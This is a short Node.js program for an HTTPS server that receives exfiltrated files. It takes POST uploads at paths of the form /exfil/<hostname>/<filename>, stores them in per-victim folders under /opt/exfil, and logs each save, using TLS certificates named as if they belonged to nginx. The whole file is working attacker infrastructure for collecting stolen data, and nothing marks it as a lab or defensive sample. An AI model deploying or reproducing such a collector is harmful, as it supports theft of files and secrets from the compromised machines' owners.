'use strict';
const https = require('https');
const fs    = require('fs');
const path  = require('path');

const EXFIL_DIR = '/opt/exfil';
const PORT      = 9443;

const options = {
    key:  fs.readFileSync('/etc/certs/nginx.key'),
    cert: fs.readFileSync('/etc/certs/nginx.crt'),
};

const server = https.createServer(options, (req, res) => {
    if (req.method !== 'POST') {
        res.writeHead(405); res.end(); return;
    }

    // URL format: /exfil/<hostname>/<filename>
    const parts = req.url.split('/').filter(p => p.length > 0);
    if (parts.length < 3 || parts[0] !== 'exfil') {
        res.writeHead(400); res.end('bad path'); return;
    }

    const hostname = parts[1].replace(/[^a-zA-Z0-9_\-\.]/g, '_');
    const filename = parts[2].replace(/[^a-zA-Z0-9_\-\.]/g, '_');
    const saveDir  = path.join(EXFIL_DIR, hostname);

    if (!fs.existsSync(saveDir))
        fs.mkdirSync(saveDir, { recursive: true });

    const savePath   = path.join(saveDir, filename);
    const fileStream = fs.createWriteStream(savePath);
    const ts         = new Date().toISOString();

    req.pipe(fileStream);
    fileStream.on('finish', () => {
        const size = fs.statSync(savePath).size;
        console.log(`[exfil-receiver] ${ts} saved ${savePath} (${size} bytes)`);
        res.writeHead(200); res.end('ok');
    });
    fileStream.on('error', err => {
        console.error(`[exfil-receiver] write error: ${err}`);
        res.writeHead(500); res.end();
    });
});

server.listen(PORT, () =>
    console.log(`[exfil-receiver] HTTPS listening on :${PORT}`)
);
